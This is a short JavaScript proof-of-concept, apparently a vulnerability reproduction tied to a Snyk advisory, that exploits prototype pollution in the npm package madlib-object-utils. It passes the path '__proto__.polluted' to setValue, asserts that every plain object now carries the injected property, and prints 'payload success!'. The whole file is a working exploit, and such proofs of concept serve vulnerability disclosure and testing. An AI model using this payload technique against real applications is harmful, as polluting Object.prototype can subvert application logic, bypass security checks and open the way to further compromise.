//https://snyk.io/vuln/SNYK-JS-MADLIBOBJECTUTILS-598676

const objectUtils = require("madlib-object-utils");
const { assert } = require("@firebase/util");
var obj = {}
console.log("Before : " + obj.polluted);
objectUtils.setValue('__proto__.polluted', {}, "yes");
console.log("After : " +{}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");